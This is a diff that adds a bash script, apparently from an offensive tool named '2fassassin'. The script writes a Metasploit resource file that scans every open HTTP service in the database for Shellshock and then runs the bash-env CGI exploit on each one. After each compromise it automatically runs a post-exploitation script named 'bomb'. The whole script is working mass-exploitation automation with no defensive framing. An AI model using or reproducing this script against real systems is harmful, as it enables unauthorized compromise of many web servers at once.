@@ -1,0 +1,42 @@
+#!/bin/bash
+
+
+input=$(cat /root/2fassassin/check/vuln/shellshock/targeturi)
+output="/root/2fassassin/check/vuln/shellshock/apache_mod_cgi_bash_env"
+echo "use auxiliary/scanner/http/apache_mod_cgi_bash_env" >> $output
+echo "set VERBOSE true" >> $output
+echo "spool /root/.msf4/loot/apache_mod_cgi_bash_env" >> $output
+echo "set THREADS 1" >> $output
+echo "<ruby>" >> $output
+echo "framework.db.hosts.each do |host|" >> $output
+echo "  host.services.each do |service|" >> $output
+echo "    if service.name == 'http' and service.state == 'open'" >> $output
+echo "      self.run_single('set RHOSTS #{host.address}')" >> $output
+echo "      self.run_single('set RPORT #{service.port}')" >> $output
+echo "      self.run_single('set TARGETURI $input')" >> $output
+echo "      self.run_single('exploit')"  >> $output
+echo "      self.run_single('exit -y')" >> $output
+echo "    end" >> $output
+echo "  end" >> $output
+echo "end" >> $output
+echo "</ruby>" >> $output
+sed -i "s/'/\"/g" $output
+echo "use exploit/multi/http/apache_mod_cgi_bash_env_exec" >> $output
+echo "set VERBOSE true" >> $output
+echo "spool /root/.msf4/loot/apache_mod_cgi_bash_env" >> $output
+echo "set THREADS 1" >> $output
+echo "set AutoRunScript multi_console_command -rc /root/2fassassin/check/vuln/shellshock/bomb" >> $output
+echo "<ruby>" >> $output
+echo "framework.db.hosts.each do |host|" >> $output
+echo "  host.services.each do |service|" >> $output
+echo "    if service.name == 'http' and service.state == 'open'" >> $output
+echo "      self.run_single('set RHOST #{host.address}')" >> $output
+echo "      self.run_single('set RPORT #{service.port}')" >> $output
+echo "      self.run_single('set TARGETURI $input')" >> $output
+echo "      self.run_single('exploit')"  >> $output
+echo "      self.run_single('exit -y')" >> $output
+echo "    end" >> $output
+echo "  end" >> $output
+echo "end" >> $output
+echo "</ruby>" >> $output
+sed -i "s/'/\"/g" $output
